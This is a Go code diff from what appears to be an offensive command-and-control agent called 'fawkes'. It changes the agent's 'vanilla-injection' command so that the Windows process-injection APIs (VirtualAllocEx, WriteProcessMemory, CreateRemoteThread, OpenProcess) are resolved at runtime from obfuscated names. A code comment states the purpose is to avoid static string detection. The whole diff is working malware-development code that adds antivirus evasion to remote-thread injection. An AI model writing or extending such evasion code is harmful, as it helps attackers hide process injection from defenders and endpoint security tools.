@@ -22,9 +22,11 @@ import (
 	"os"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 )
 
@@ -41,14 +43,29 @@ const (
 	PAGE_READWRITE    = 0x04
 )
 
+// Injection API procs — resolved at runtime from encrypted names to avoid
+// static string detection (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, etc.)
 var (
-	kernel32               = syscall.NewLazyDLL("kernel32.dll")
-	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
-	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
-	procOpenProcess        = kernel32.NewProc("OpenProcess")
-	procCloseHandle        = kernel32.NewProc("CloseHandle")
+	kernel32               *syscall.LazyDLL
+	procVirtualAllocEx     *syscall.LazyProc
+	procWriteProcessMemory *syscall.LazyProc
+	procCreateRemoteThread *syscall.LazyProc
+	procOpenProcess        *syscall.LazyProc
+	procCloseHandle        *syscall.LazyProc
+	initInjectionAPIs      sync.Once
 )
+
+func ensureInjectionAPIs() {
+	initInjectionAPIs.Do(func() {
+		k32 := obfuscate.Kernel32Dll()
+		kernel32 = syscall.NewLazyDLL(k32)
+		procVirtualAllocEx = kernel32.NewProc(obfuscate.VirtualAllocEx())
+		procWriteProcessMemory = kernel32.NewProc(obfuscate.WriteProcessMemory())
+		procCreateRemoteThread = kernel32.NewProc(obfuscate.CreateRemoteThread())
+		procOpenProcess = kernel32.NewProc(obfuscate.OpenProcess())
+		procCloseHandle = kernel32.NewProc("CloseHandle")
+	})
+}
 
 // VanillaInjectionCommand implements the vanilla-injection command
 type VanillaInjectionCommand struct{}
@@ -77,6 +94,7 @@ func isMigrateAction(action string) bool {
 
 // Execute executes the vanilla-injection command
 func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
+	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
 		return errorResult("Error: This command is only supported on Windows")
 	}
